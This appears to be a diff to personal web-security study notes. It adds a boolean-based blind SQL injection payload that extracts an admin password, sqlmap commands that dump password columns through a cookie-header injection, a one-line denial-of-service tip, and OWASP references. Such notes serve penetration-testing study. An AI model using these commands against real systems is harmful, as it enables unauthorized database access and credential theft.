@@ -106,3 +106,17 @@ sqlmap -u "url" -technique=U -T users --columns // get the columns of users tabl
 sqlmap -u "url" -technique=U -T users -C password // get the password field from tables users
 sqlmap -u "url" -technique=U -T users --dump // get the data from users table
 
+Boolean Based SQLI (Blind)
+select * from Tracking WHERE trackingID='123453432' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='1'-- // here we check whether the first character is a
+
+sqlmap -u "url" --headers 'Cookie:...*;session...' --technique=B -T users -C password --dump --where="username='administrator'" // we put * after cookie so sqlmap knows to test for it
+
+to test for blind sql injection you can try to set ' AND '1'='1' and then '1'='2' and see whether the results vary
+
+DOS:
+have a 10mb comment can cause dos
+
+
+The Web Application Hacker's Handbook: https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470
+OWASP Top 10: https://owasp.org/www-project-top-ten/
+OWASP Web Security Testing Guide: https://github.com/OWASP/wstg/tree/master
